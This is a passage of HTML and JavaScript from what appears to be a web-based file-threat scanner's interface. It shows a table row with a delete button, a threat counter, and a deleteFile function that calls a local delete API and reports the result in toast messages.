                            <button class="btn btn-danger btn-sm action-btn" id="delete" title="Delete File">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>`
                    ]).draw();
                    
                    threatsFound++;
                    updateStats();
                }
            });
        }
        function deleteFile(path) {
            showToast("Processing file...", "info");
            
            fetch('?api=delete&dir=' + encodeURIComponent(path))
            .then(res => {
                if (!res.ok) {
                    throw new Error('Network response was not ok');
                }
                return res.json();
            })
            .then(res => {
                if (res.msg === 'success') {
                    showToast("File processed successfully", "success");
                    console.log("File processed:", path);
                } else {
                    showToast("Error: " + res.msg, "danger");
                }
            })
            .catch(error => {
                showToast("Error processing file: " + error.message, "danger");
                console.error("Delete error:", error);
            });
        }
    </script>
</body>
</html>
